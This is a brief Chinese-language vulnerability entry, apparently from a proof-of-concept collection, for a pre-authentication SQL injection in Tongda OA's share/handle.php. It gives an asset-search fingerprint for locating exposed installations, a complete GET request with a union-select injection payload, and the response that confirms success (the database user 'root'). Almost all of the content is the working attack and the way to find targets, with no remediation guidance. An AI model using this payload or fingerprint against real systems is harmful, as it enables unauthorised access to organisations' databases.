# 通达OAshare前台SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **指纹**：`app.name="通达 OA"`
- **请求**：`GET /share/handle.php?\_GET\[module]=1%27={`%27`%202}+union%20select%20user()--+ HTTP/1.1`
- **响应特征**：200 root